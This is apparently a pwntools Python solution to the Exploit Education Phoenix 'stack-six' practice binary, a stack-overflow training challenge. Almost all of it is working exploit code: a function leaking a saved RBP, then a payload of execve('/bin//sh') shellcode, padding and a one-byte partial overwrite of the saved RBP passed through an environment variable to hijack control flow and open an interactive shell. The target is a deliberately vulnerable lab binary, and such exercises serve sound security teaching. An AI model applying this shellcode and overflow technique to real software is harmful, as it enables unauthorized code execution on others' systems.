from pwn import *

# The overflow lets us do a partial overwrite of the saved RBP, which gives us control of main's ret. First we leak the correct saved RBP, then substract 0x10 as our buffer is located 0x10 higher on the stack, the leave then does all the work for us and puts the address of our buffer on the top of the stack, ready to be put into RIP

def leak():
    buf = 'a'*0x7e
    s = process('/opt/phoenix/amd64/stack-six',env={'ExploitEducation':buf})
    res = s.recvall().strip()
    leak = res.split(' ')[-1][0x7e:] + '\x00'*2
    #print(leak)
    print(hex(u64(leak)))

def exploit():
    byte = '\x50'
    buf = "\x48\x31\xc0\x50\xb0\x3b\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05\xb0\x3c\x48\x31\xff\x0f\x05"
    buf += 'a'*(0x7e-len(buf))
    buf += byte

    #with open('buf.txt','wb') as f:
        #f.write(buf)
    s = process('/opt/phoenix/amd64/stack-six',env={'ExploitEducation':buf})

    s.interactive()

#leak()
exploit()
